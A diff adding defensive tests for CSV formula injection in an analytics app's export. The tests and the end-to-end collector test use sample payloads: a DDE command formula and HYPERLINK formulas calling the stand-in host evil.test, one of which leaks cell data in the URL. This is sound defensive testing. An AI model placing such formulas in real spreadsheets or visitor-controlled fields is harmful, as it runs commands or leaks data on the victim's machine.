@@ -7,10 +7,21 @@ whether it survives values that break hand-rolled CSV.
 import csv
 import datetime as dt
 import io
+from urllib.parse import quote
+
+import pytest
 
 from app.models import Event
 from app.services import accounts
-from tests.conftest import OWNER_PASSWORD, SITE_DOMAIN, with_local_bucket
+from tests.conftest import (
+    OWNER_PASSWORD,
+    SITE_DOMAIN,
+    with_local_bucket,
+)
+
+CHROME_DESKTOP = (
+    "Mozilla/5.0 (Macintosh) AppleWebKit/537.36 Chrome/120 Safari/537.36"
+)
 
 
 def add_event(db, **overrides):
@@ -140,3 +151,64 @@ def test_revenue_survives_the_export(signed_in, db_session, rebuild_rollups, sit
     assert by_dimension[("source", "Google")][-1] == "4990"
     # The money is attributed to the page the purchase fired on, not spread.
     assert by_dimension[("page", "/checkout")][-1] == "4990"
+
+
+@pytest.mark.parametrize(
+    ("value", "expected", "why"),
+    [
+        ("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1", "the DDE form"),
+        ('=HYPERLINK("http://evil.test",“x”)', "'=", "a link that exfiltrates on click"),
+        ("+41791234567", "'+41791234567", "a plus, which a phone number also starts with"),
+        ("-2+3", "'-2+3", "a minus"),
+        ("@SUM(A1:A9)", "'@SUM(A1:A9)", "an at, which Lotus-style syntax uses"),
+        ("\tcmd", "'\tcmd", "a tab some importers strip before acting"),
+        ("summer-sale", "summer-sale", "a dash inside the word is not a lead"),
+        ("/pricing", "/pricing", "an ordinary path"),
+        ("", "", "an empty cell"),
+    ],
+)
+def test_a_cell_a_spreadsheet_would_run_is_written_as_text(value, expected, why):
+    """Every dimension value in this file is chosen by a visitor.
+
+    A campaign tag of `=HYPERLINK("http://evil.test/?"&A1,"sale")` needs no
+    access beyond loading a page on the site being measured -- it passes every
+    gate the collector has, because the URL carrying it really is on that site
+    -- and then waits in the analytics until the owner opens the export, where
+    it runs as them.
+
+    csv.writer was never enough for this. It quotes correctly for a CSV parser,
+    and Excel strips the quotes and evaluates what is inside.
+    """
+    from app.services.exports import _defused
+
+    result = _defused(value)
+    assert result.startswith(expected), f"{why}: {value!r} became {result!r}"
+
+
+def test_defusing_leaves_numbers_alone():
+    """A stray apostrophe would turn a count into a string for every reader."""
+    from app.services.exports import _defused
+
+    assert [_defused(v) for v in (0, 42, -7)] == [0, 42, -7]
+
+
+def test_a_visitor_cannot_put_a_live_formula_in_the_owners_export(
+    client, site, signed_in, rebuild_rollups
+):
+    """End to end, through the collector the same way a real visitor would."""
+    payload = "=HYPERLINK('http://evil.test','sale')"
+    client.post(
+        "/api/event",
+        json={
+            "site_id": SITE_DOMAIN,
+            "url": f"https://{SITE_DOMAIN}/s?utm_campaign={quote(payload)}&utm_source=x",
+        },
+        headers={"user-agent": CHROME_DESKTOP},
+    )
+    rebuild_rollups()
+
+    body = client.get(f"/sites/{SITE_DOMAIN}/export.csv?range=30d").text
+    cells = [c for row in csv.reader(io.StringIO(body)) for c in row]
+    dangerous = [c for c in cells if c.startswith(("=", "+", "@")) or c.startswith("-")]
+    assert not dangerous, f"cells a spreadsheet would execute: {dangerous}"
+    assert [c for c in cells if "HYPERLINK" in c], "the campaign never reached the export"
